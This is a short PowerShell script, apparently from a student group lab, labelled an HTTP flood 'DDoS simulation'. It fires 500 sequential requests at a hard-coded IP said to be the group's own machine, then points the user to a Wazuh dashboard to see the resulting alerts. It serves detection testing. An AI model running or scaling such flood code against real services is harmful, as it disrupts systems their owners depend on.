# ============================================
# MIKS Group Task - DDoS HTTP Flood Script
# ============================================
# TARGET: 70.153.148.250 (MIKS-Agent-1 milik kelompok sendiri)
# JANGAN UBAH IP TARGET! Menyerang IP lain = ILEGAL!
# ============================================

$target = "http://70.153.148.250/"
$totalRequests = 500
$successCount = 0
$failCount = 0

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   MIKS DDoS Simulation - HTTP Flood" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Target  : $target" -ForegroundColor White
Write-Host "Requests: $totalRequests" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Memulai serangan dalam 3 detik..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

$startTime = Get-Date
Write-Host "[!] SERANGAN DIMULAI pada $($startTime.ToString('HH:mm:ss'))" -ForegroundColor Red
Write-Host ""

for ($i = 1; $i -le $totalRequests; $i++) {
    try {
        Invoke-WebRequest -Uri $target -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
        $successCount++
        Write-Host "`r[FLOOD] Request #$i / $totalRequests - OK" -ForegroundColor Yellow -NoNewline
    } catch {
        $failCount++
        Write-Host "`r[FLOOD] Request #$i / $totalRequests - TIMEOUT" -ForegroundColor DarkYellow -NoNewline
    }
}

$endTime = Get-Date
$duration = ($endTime - $startTime).TotalSeconds

Write-Host ""
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   SERANGAN SELESAI!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "Waktu mulai  : $($startTime.ToString('HH:mm:ss'))" -ForegroundColor White
Write-Host "Waktu selesai: $($endTime.ToString('HH:mm:ss'))" -ForegroundColor White
Write-Host "Durasi       : $([math]::Round($duration, 1)) detik" -ForegroundColor White
Write-Host "Total request: $totalRequests" -ForegroundColor White
Write-Host "Berhasil     : $successCount" -ForegroundColor Green
Write-Host "Gagal/Timeout: $failCount" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Sekarang buka Dashboard Wazuh untuk melihat alertnya!" -ForegroundColor Cyan
Write-Host "URL: https://70.153.25.121" -ForegroundColor Cyan
